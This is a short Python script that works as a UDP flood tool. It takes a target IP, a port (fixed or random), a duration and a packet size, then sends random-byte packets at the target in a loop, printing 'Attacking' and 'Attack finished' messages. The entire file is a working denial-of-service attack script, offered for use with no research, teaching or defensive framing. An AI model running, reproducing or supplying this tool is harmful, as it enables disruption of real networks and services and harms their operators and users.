import socket
import random
import time
import os
import sys

if len(sys.argv) == 1:
	sys.exit('\n\033[1;37mRequired arguments are missing. Use: \033[1;36mpython ud.py <ip> <port> <time> <size>\033[1;37m\nYou could pass 0 for port, time & size. (random ports, unlimited time, 1024 bytes)\nExample: \033[1;36mpython ud.py 1.3.3.7 0 0 0 \033[1;37mor \033[1;36mpython ud.py 1.3.3.7 80 30 65500\033[1;m\n')

def check(x):
	if not x != 0:
		return False
	else:
		return True

def UDP():

	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	randomport = check(port)
	timed = int(sys.argv[3])
	unlimitedtime = check(timed)
	sbytes = int(sys.argv[4])
	nobytes = check(sbytes)

	if nobytes is True:
		if sbytes < 512 or sbytes > 65530:
			print("\n\033[1;37mSize value can't be lower than 512 or higher than 65530.\033[1;m\n")
			return

	startup = time.time()

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = os.urandom((1024, sbytes)[nobytes])
	print("\n\033[1;37mAttacking \033[1;36m{0} \033[1;37mon \033[1;36m{a} \033[1;37mfor \033[1;36m{b} \033[1;37mwith a size of \033[1;36m{c} \033[1;37mbytes.\nCancel it with CTRL+C at any time.\033[1;m\n".format(ip, a="random ports" if port==0 else "port {0}".format(port), b="unlimited time" if timed==0 else "{0} seconds".format(timed), c=(1024, sbytes)[nobytes]))
	timed = (9999, timed)[unlimitedtime]
	while True:
		port = (random.randint(1, 65535), port)[randomport]
		endtime = time.time()
		if (startup+timed) < endtime:
			break
		else:
			sock.sendto(bytes,(ip, port))
	print("\n\033[1;37mAttack finished.\033[1;m\n")

if __name__ == "__main__":
	try:
		UDP()
	except KeyboardInterrupt:
		print("\n\033[1;37mThe program has been stopped.\n\033[1;m")
	except IndexError:
		print("\n\033[1;37mRequired arguments are missing.\n\033[1;m")